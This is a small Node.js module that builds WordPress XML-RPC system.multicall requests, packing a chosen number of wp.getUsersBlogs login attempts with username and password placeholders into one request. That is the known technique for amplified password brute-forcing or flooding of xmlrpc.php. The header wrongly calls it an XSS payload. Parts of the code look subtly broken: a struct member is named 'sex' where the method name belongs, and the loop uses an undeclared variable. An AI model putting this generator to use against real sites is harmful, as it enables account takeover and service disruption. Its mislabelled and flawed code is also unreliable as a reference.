/**
 * @author Trickster <trickster@popbob.email>
 * @description Create an XSS payload for XMLRPC
 * @module xmlgen.js
 */

///////////

const { XMLParser, XMLBuilder, XMLValidator } = require("fast-xml-parser");

const parser = new XMLParser();
const builder = new XMLBuilder();

const types = {
  "one": parser.parse("<methodCall><" + "methodName" + ">system.multicall</" + "methodName" + "><params><param><value><array><data>\n\n<value><struct><member><name>" + "sex" + "</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\\{\\{ Your Username \\}\\}</string></value><value><string>\\{\\{ Your Password \\}\\}</string></value></data></array></value></data></array></value></member></struct></value>\n\n<value><struct><member><name>" + "sex" + "</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\\{\\{ Your Username \\}\\}</string></value><value><string>\\{\\{ Your Password \\}\\}</string></value></data></array></value></data></array></value></member></struct></value>\n\n<value><struct><member><name>" + "sex" + "</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\\{\\{ Your Username \\}\\}</string></value><value><string>\\{\\{ Your Password \\}\\}</string></value></data></array></value></data></array></value></member></struct></value>\n\n<value><struct><member><name>" + "sex" + "</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\\{\\{ Your Username \\}\\}</string></value><value><string>\\{\\{ Your Password \\}\\}</string></value></data></array></value></data></array></value></member></struct></value>\n\n</data></array></value></param></params></methodCall>"),
}
const data = {
  "value": [
    {
      "struct": {
        "member": [
          {
            "name": "sex",
            "value": [
              {
                "string": "wp.getUsersBlogs"
              }
            ]
          },
          {
            "name": "params",
            "value": [
              {
                "array": {
                  "data": {
                    "value": [
                      {
                        "array": {
                          "data": {
                            "value": [
                              {
                                "string": "\\{\\{ Your Username \\}\\}"
                              },
                              {
                                "string": "\\{\\{ Your Password \\}\\}"
                              }
                            ]
                          }
                        }
                      }
                    ]
                  }
                }
              }
            ]
          }
        ]
      }
    }
  ]
}


/**
  * @param {number} amt - amount of packets/data to insert
  * @returns built xml without <xml> tag
  * @generator
  */

function generateXML(amt) {
  for (i = 0; i <= amt; i++) {
    types.one.methodCall.params.param.value.array.data.value.push(data.value[0])
  }
  return builder.build(types.one)
}

module.exports.gd = generateXML